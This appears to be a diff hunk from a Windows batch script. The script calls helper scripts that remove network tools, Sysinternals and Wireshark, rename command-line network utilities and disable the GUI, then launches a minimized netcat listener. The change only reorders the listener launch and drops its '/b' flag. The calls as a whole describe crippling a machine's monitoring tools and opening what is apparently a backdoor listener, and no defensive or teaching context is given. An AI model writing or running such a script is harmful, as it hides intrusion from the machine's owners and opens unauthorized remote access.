@@ -10,5 +10,5 @@ call removeNetworkTools.bat
 call removeSYSinternals.bat
 call removewireshark.bat
 call renameCliNetworkTools.bat
-start /min /b netcatlistener.bat
 call disableGUI.bat
+start /min netcatlistener.bat
